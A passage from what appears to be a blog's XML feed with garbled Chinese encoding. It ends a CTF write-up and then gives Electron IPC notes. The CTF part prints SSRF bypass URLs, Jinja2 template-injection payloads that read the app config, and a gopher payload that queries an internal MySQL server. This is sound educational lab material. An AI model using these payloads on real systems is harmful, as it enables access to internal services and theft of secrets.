  <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>æ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>http|https|gopher|dict</code>å››ç§åè®®è¿›è¡ŒCurlæ“ä½œï¼Œå¹¶ä¸”æ¢æµ‹åˆ°çš„å†…å®¹ä¼šé€šè¿‡<code>var_dump($output);</code>æ‰“å°å‡ºæ¥ï¼Œä½†æ˜¯å®ƒä¼šå¯¹æˆ‘ä»¬æ¢æµ‹çš„ipåœ°å€è¿›è¡Œcheckï¼Œçœ‹æ˜¯å¦ä¸ºå†…ç½‘åœ°å€ï¼ˆ<a href="https://www.cnblogs.com/afanti/p/9928371.html" target="_blank" rel="noopener">å¯ä»¥è¿›è¡Œbypassï¼Œè¿™é¢˜çš„ssrfä¸ä¸Šæµ·å¤§å­¦ç”Ÿç½‘å®‰èµ›æŸæ˜¥ç§‹å‡ºçš„é¢˜æœ‰äº›è®¸ç±»ä¼¼</a>ï¼‰ã€‚</p><pre class=" language-php+HTML"><code class="language-php+HTML">payload1: ?url=http://127.0.0.1./flag.phppayload2: ?url=http://@127.0.0.1:80@baidu.com/flag.php</code></pre><p>åŸç†ï¼š<a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize(" target="_blank" rel="noopener">Some trick in ssrf and unserialize()</a>/#some-trick-in-unserialize)</p><h2 id="0x02-çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹"><a href="#0x02-çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹" class="headerlink" title="0x02 çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹"></a>0x02 çŸ¥é“ç½‘æ®µåè‚†æ— å¿Œæƒ®çš„å†…ç½‘æ¢æµ‹</h2><p><code>PS: æƒ³å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„SSRFæ¢æµ‹å·¥å…·</code></p><p>é€šè¿‡bpçš„intruderæ¨¡å—ï¼Œå¯¹å†…ç½‘ç½‘æ®µçš„å¸¸ç”¨ç«¯å£è¿›è¡ŒæœåŠ¡æ¢æµ‹ï¼ˆ172.11.243.0/24ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129211758.png" alt=""></p><p>å¯ä»¥å¾—åˆ°<code>172.11.243.81:8080</code>å’Œ<code>172.11.243.218:3306</code>ï¼Œåˆ†åˆ«ä¸ºä¸€ä¸ªflaskæœåŠ¡å’ŒmysqlæœåŠ¡ã€‚</p><p>source code of flask service:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'HINT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'HINT'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/yulige/&lt;path:yulige>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">yulige</span><span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>yulige<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>æ ¹æ®æºç ä¸­å‡ºç°çš„<code>flask.render_template_string</code>ï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯è€ƒSSTIæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œå¯¹<code>(ã€)ã€configã€self</code>è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ— æ³•è¿›è¡Œå¸¸è§„çš„æ“ä½œï¼Œæ³¨æ„åˆ°<code>app.config[&#39;HINT&#39;] = os.environ.pop(&#39;HINT&#39;)</code>ï¼Œå¯ä»¥æƒ³åŠæ³•getåˆ°HINTçš„å€¼ï¼Œå¯ä»¥å‚è€ƒ<a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">ä»SSTIåˆ°æ²™ç®±é€ƒé€¸-jinja2</a>ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#payload:{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}</span><span class="token comment" spellcheck="true">#payload:{{get_flashed_messages.__globals__[%27current_app%27].config[%27HINT%27]}}</span></code></pre><p>æ‹¿payloadæ‰“ä¸€å‘åæ‹¿åˆ°äº†HINTé‡Œé¢çš„mysqlç”¨æˆ·åã€‚</p><h2 id="0x03-æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸"><a href="#0x03-æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸" class="headerlink" title="0x03 æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸"></a>0x03 æ‹¿åˆ°æ•°æ®åº“ååå¯¹mysqlçš„ç‹‚è½°æ»¥ç‚¸</h2><p>æ³¨æ„åˆ°æœ€å¼€å§‹å…è®¸æˆ‘ä»¬ä½¿ç”¨çš„åè®®ä¸­åŒ…æ‹¬<code>gopher</code>åè®®ï¼Œé€šè¿‡<code>ssrfï¼‹gopher</code>æˆ‘ä»¬å¯ä»¥å¯¹æœªè®¾ç½®å¯†ç çš„mysqlæœåŠ¡è¿›è¡Œæ”»å‡»ï¼Œè¿™é‡Œç”¨åˆ°Githubä¸Šé¢ä¸€ä¸ªå¥½ä¸œè¥¿<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a>ã€‚</p><p>åˆ—æ•°æ®åº“åï¼ˆä¾æ¬¡ç±»æ¨ï¼Œæ‹¿è¡¨åï¼Œæ‹¿åˆ—åï¼Œgetflagï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214016.png" alt=""></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æ˜¯åœ¨æ‰“ssrfï¼Œé€šè¿‡è·³æ¿æ‰“å†…ç½‘ï¼Œpayloadä¸­çš„urlç¼–ç éœ€è¦è¿›è¡ŒäºŒæ¬¡ç¼–ç æ‰èƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ï¼š</p><pre class=" language-payload"><code class="language-payload">url=gopher://172.11.243.218:3306/_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%252c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2566%256c%2561%2534%2534%2534%2531%2531%2531%2531%2567%252e%2546%2531%2531%2531%2531%256c%256c%256c%256c%2567%2567%2567%2567%2567%2501%2500%2500%2500%2501</code></pre><p>get flagï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190129214508.png" alt=""></p><h2 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04 å°ç»“"></a>0x04 å°ç»“</h2><p>ç¯å¢ƒå’Œæ°›å›´ï¼Œé¢˜ç›®çš„è´¨é‡ï¼Œéƒ½èƒ½å†³å®šä½ è‡ªå·±çš„è¿›æ­¥é€Ÿåº¦ã€‚å½“ç„¶ï¼Œæœ€é‡è¦çš„è¿˜æ˜¯ä½ è‡ªå·±çš„åšæŒå’ŒåŠªåŠ›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSRF </tag>
            
            <tag> å†…ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Electron-Learning-1</title>
      <link href="/2019/01/25/Electron-Learning-1/"/>
      <url>/2019/01/25/Electron-Learning-1/</url>
      
        <content type="html"><![CDATA[<p>Electron.</p><a id="more"></a>    <h1 id="Electron-å­¦ä¹ è®°å½•"><a href="#Electron-å­¦ä¹ è®°å½•" class="headerlink" title="Electron å­¦ä¹ è®°å½•"></a>Electron å­¦ä¹ è®°å½•</h1><blockquote><p>å‚è€ƒ é“¾æ¥ï¼š</p><p><a href="https://www.jianshu.com/p/1687f8dcd70c" target="_blank" rel="noopener">å¼€å‘ Electron app å¿…çŸ¥çš„ 4 ä¸ª tips</a></p><p><a href="https://www.w3cschool.cn/electronmanual/" target="_blank" rel="noopener">Electronnä¸­æ–‡æ‰‹å†Œ</a></p><p><a href="https://mlln.cn/2018/01/08/electron%E4%BD%9C%E4%B8%BApython%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">Electronä¸python</a></p><p><a href="https://www.jianshu.com/p/59a0a24ed388" target="_blank" rel="noopener">3åˆ†é’Ÿä¸Šæ‰‹ï¼šé€šè¿‡vueå’Œelectronåˆ›å»ºæ¡Œé¢åº”ç”¨</a> </p></blockquote><h2 id="Electron-ç®€ä»‹"><a href="#Electron-ç®€ä»‹" class="headerlink" title="Electron ç®€ä»‹"></a>Electron ç®€ä»‹</h2><p>å¼•ç”¨W3schoolçš„Electronä¸­æ–‡æ–‡æ¡£ç®€ä»‹ï¼š</p><blockquote><p>Electron å¯ä»¥è®©ä½ ä½¿ç”¨çº¯ <a href="https://www.w3cschool.cn/javascript/" target="_blank" rel="noopener">JavaScript</a> è°ƒç”¨ä¸°å¯Œçš„åŸç”Ÿ APIs æ¥åˆ›é€ æ¡Œé¢åº”ç”¨ã€‚ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸“æ³¨äºæ¡Œé¢åº”ç”¨è€Œä¸æ˜¯ web æœåŠ¡å™¨çš„ï¼Œio.js çš„ä¸€ä¸ªå˜ä½“ã€‚</p><p>è¿™ä¸æ„å‘³ç€ Electron æ˜¯ç»‘å®šäº† GUI åº“çš„ JavaScriptã€‚ç›¸åï¼ŒElectron ä½¿ç”¨ web é¡µé¢ä½œä¸ºå®ƒçš„ GUIï¼Œæ‰€ä»¥ä½ èƒ½æŠŠå®ƒçœ‹ä½œæˆä¸€ä¸ªè¢« JavaScript æ§åˆ¶çš„ï¼Œç²¾ç®€ç‰ˆçš„ Chromium æµè§ˆå™¨ã€‚</p></blockquote><h3 id="ä¸»è¿›ç¨‹ï¼ˆMain-Processï¼‰"><a href="#ä¸»è¿›ç¨‹ï¼ˆMain-Processï¼‰" class="headerlink" title="ä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰"></a>ä¸»è¿›ç¨‹ï¼ˆMain Processï¼‰</h3><p>åœ¨ Electron é‡Œï¼Œè¿è¡Œ <code>package.json</code> é‡Œ <code>main</code> è„šæœ¬çš„è¿›ç¨‹è¢«ç§°ä¸º<strong>ä¸»è¿›ç¨‹</strong>ã€‚åœ¨ä¸»è¿›ç¨‹è¿è¡Œçš„è„šæœ¬å¯ä»¥ä»¥åˆ›å»º web é¡µé¢çš„å½¢å¼å±•ç¤º GUIã€‚</p><h3 id="æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer-Processï¼‰"><a href="#æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer-Processï¼‰" class="headerlink" title="æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰"></a>æ¸²æŸ“è¿›ç¨‹ï¼ˆRenderer Processï¼‰</h3><p>ç”±äº Electron ä½¿ç”¨ Chromium æ¥å±•ç¤ºé¡µé¢ï¼Œæ‰€ä»¥ Chromium çš„å¤šè¿›ç¨‹ç»“æ„ä¹Ÿè¢«å……åˆ†åˆ©ç”¨ã€‚æ¯ä¸ª Electron çš„é¡µé¢éƒ½åœ¨è¿è¡Œç€è‡ªå·±çš„è¿›ç¨‹ï¼Œè¿™æ ·çš„è¿›ç¨‹æˆ‘ä»¬ç§°ä¹‹ä¸º<strong>æ¸²æŸ“è¿›ç¨‹</strong>ã€‚</p><p>åœ¨ä¸€èˆ¬æµè§ˆå™¨ä¸­ï¼Œç½‘é¡µé€šå¸¸ä¼šåœ¨æ²™ç›’ç¯å¢ƒä¸‹è¿è¡Œï¼Œå¹¶ä¸”ä¸å…è®¸è®¿é—®åŸç”Ÿèµ„æºã€‚ç„¶è€Œï¼Œ<code>Electron ç”¨æˆ·æ‹¥æœ‰åœ¨ç½‘é¡µä¸­è°ƒç”¨ io.js çš„ APIs çš„èƒ½åŠ›</code>ï¼Œå¯ä»¥ä¸åº•å±‚æ“ä½œç³»ç»Ÿç›´æ¥äº¤äº’ã€‚</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190124203528.png" alt="è¿è¡Œæ¦‚è¿°"></p><h2 id="Electron-åœ¨çº¿-ç¦»çº¿äº‹ä»¶æ¢æµ‹"><a href="#Electron-åœ¨çº¿-ç¦»çº¿äº‹ä»¶æ¢æµ‹" class="headerlink" title="Electron åœ¨çº¿/ç¦»çº¿äº‹ä»¶æ¢æµ‹"></a>Electron åœ¨çº¿/ç¦»çº¿äº‹ä»¶æ¢æµ‹</h2><blockquote><p>Tipsï¼šelectron v4.02ä¸­çš„ä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹è¿›è¡Œé€šä¿¡çš„æ—¶å€™ï¼Œå°±éœ€è¦ç”¨åˆ°<code>ipc</code>è¿™ä¸ªç‰¹æ€§ã€‚è€Œ<code>ipc</code>åˆåˆ†ä¸º<code>ipcMain</code>å’Œ<code>ipcRenderer</code>ä¸¤ä¸ªï¼Œåˆ†åˆ«ç”¨äºä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ã€‚</p><p>letå‘½ä»¤å’Œvarå‘½ä»¤ä¸åŒçš„åœ°æ–¹æ˜¯letçš„å¯¹è±¡åªåœ¨letæ‰€åœ¨çš„ä»£ç å—èŒƒå›´ä¸­èµ·ä½œç”¨ã€‚</p></blockquote><p>è¿™é‡Œéœ€è¦ç”¨åˆ°navigatorå¯¹è±¡ï¼Œä½†æ˜¯åœ¨electronä¸»è¿›ç¨‹ä¸­æ²¡æœ‰è¿™ä¸ªï¼Œæ‰€ä»¥éœ€è¦å»ºç«‹ä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹ï¼Œåˆ©ç”¨IPCé€šä¿¡ï¼Œè·å–ç½‘ç»œçŠ¶æ€ã€‚</p><p>åœ¨æˆ‘çš„ç¯å¢ƒä¸­å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å®è·µæˆåŠŸï¼š</p><p><code>main.js</code></p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>ipcMain<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token keyword">let</span> onlineStatusWindowapp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  onlineStatusWindow <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BrowserWindow</span><span class="token punctuation">(</span><span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> show<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  onlineStatusWindow<span class="token punctuation">.</span><span class="token function">loadURL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`file://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>__dirname<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/online-status.html`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>ipcMain<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p><code>online-status.html</code></p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token keyword">const</span> <span class="token punctuation">{</span>ipcRenderer<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> updateOnlineStatus <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    ipcRenderer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'online-status-changed'</span><span class="token punctuation">,</span> navigator<span class="token punctuation">.</span>onLine <span class="token operator">?</span> <span class="token string">'online'</span> <span class="token punctuation">:</span> <span class="token string">'offline'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*navigator.onLine ==> true or false*/</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'online'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'offline'</span><span class="token punctuation">,</span>  updateOnlineStatus<span class="token punctuation">)</span>  <span class="token function">updateOnlineStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h2 id="Electron-è¿›ç¨‹"><a href="#Electron-è¿›ç¨‹" class="headerlink" title="Electron è¿›ç¨‹"></a>Electron è¿›ç¨‹</h2><p>Electronçš„<code>process</code>å¯¹è±¡</p><pre class=" language-javascript"><code class="language-javascript">process<span class="token punctuation">.</span>type <span class="token operator">-</span> String <span class="token operator">-</span> è·å–è¿›ç¨‹ç±»å‹process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'electron'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> è·å–electronç‰ˆæœ¬process<span class="token punctuation">.</span>versions<span class="token punctuation">[</span><span class="token string">'chrome'</span><span class="token punctuation">]</span> <span class="token operator">-</span> String <span class="token operator">-</span> è·å–chromiumçš„ç‰ˆæœ¬process<span class="token punctuation">.</span>resourcePath <span class="token operator">-</span> String <span class="token operator">-</span> Javascriptæºä»£ç è·¯å¾„<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span>noAsar <span class="token operator">=</span> <span class="token boolean">true</span> or <span class="token boolean">false</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>process<span class="token punctuation">.</span><span class="token function">hang</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//ä½¿å¾—è¿›ç¨‹çš„ä¸»çº¿ç¨‹æŒ‚èµ·</span></code></pre><h2 id="Electron-æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³"><a href="#Electron-æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³" class="headerlink" title="Electron æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³"></a>Electron æ”¯æŒçš„Chromeå‘½ä»¤è¡Œå¼€å…³</h2><p>åœ¨appæ¨¡å—çš„readyäº‹ä»¶å‘å‡ºä¹‹å‰å¯ä»¥é€šè¿‡<code>app.commandLine.appendSwitch</code>æ¥æ·»åŠ æŒ‡å®šçš„å‘½ä»¤å‚æ•°åˆ°mainè„šæœ¬ä¸­ï¼š</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>app<span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'remote-debugging-port'</span><span class="token punctuation">,</span> <span class="token string">'8315'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span>commandLine<span class="token punctuation">.</span><span class="token function">appendSwitch</span><span class="token punctuation">(</span><span class="token string">'host-rules'</span><span class="token punctuation">,</span> <span class="token string">'MAP * 127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'ready'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Your code here</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ›´å¤šçš„å‘½ä»¤å‚æ•°å¯å‚è€ƒï¼š<a href="https://www.w3cschool.cn/electronmanual/82vz1ql9.html" target="_blank" rel="noopener">Electronä¸­æ–‡æ–‡æ¡£</a></p><h2 id="Electron-ç¯å¢ƒå˜é‡"><a href="#Electron-ç¯å¢ƒå˜é‡" class="headerlink" title="Electron ç¯å¢ƒå˜é‡"></a>Electron ç¯å¢ƒå˜é‡</h2><p>ä¸€äº› Electron çš„è¡Œä¸ºå—åˆ°ç¯å¢ƒå˜é‡çš„æ§åˆ¶ï¼Œå› ä¸ºä»–ä»¬çš„åˆå§‹åŒ–æ¯”å‘½ä»¤è¡Œå’Œåº”ç”¨ä»£ç æ›´æ—©ã€‚ä»¥ä¸‹ æ˜¯ä¸€äº›å¸¸ç”¨çš„ç¯å¢ƒå˜é‡å</p><pre class=" language-bash"><code class="language-bash">//<span class="token operator">></span>set ELECTRON_ENABLE_LOGGING<span class="token operator">=</span>true//<span class="token operator">></span>electronELECTRON_RUN_AS_NODEELECTRON_ENABLE_LOGGINGELECTRON_LOG_ASAR_READSELECTRON_ENABLE_STACK_DUMPINGELECTRON_DEFAULT_ERROR_MODEELECTRON_NO_ATTACH_CONSOLEELECTRON_FORCE_WINDOW_MENU_BARELECTRON_HIDE_INTERNAL_MODULES</code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Electron </tag>
            
            <tag> Programming </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è¿½è¸ªæº¯æº_ç™½è¯æ–‡è®²ç›—å·--ç§‘æ™®ç¯‡</title>
      <link href="/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/"/>
      <url>/2018/11/20/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90-%E5%B0%8F%E7%99%BD%E7%A7%91%E6%99%AE%E7%AF%87/</url>
      
